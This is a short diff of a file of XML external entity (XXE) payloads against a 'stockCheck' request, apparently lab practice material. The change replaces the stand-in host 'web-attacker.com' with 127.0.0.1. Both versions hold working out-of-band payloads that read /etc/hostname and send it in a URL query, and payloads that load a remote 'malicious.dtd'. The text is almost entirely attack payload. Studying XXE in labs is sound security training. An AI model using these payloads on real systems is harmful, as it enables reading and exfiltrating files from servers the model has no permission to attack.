@@ -58,12 +58,12 @@
 </stockCheck3>
 
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1/?x=%file;'>">
 %eval;
 %exfiltrate;
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/malicious.dtd"> %xxe;]>
 <stockCheck>
     <productId>&file;</productId>
     <storeId>3;</storeId>
@@ -75,7 +75,7 @@
 %error;
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/malicious.dtd"> %xxe;]>
 <stockCheck>
     <productId>&file;</productId>
     <storeId>3;</storeId>
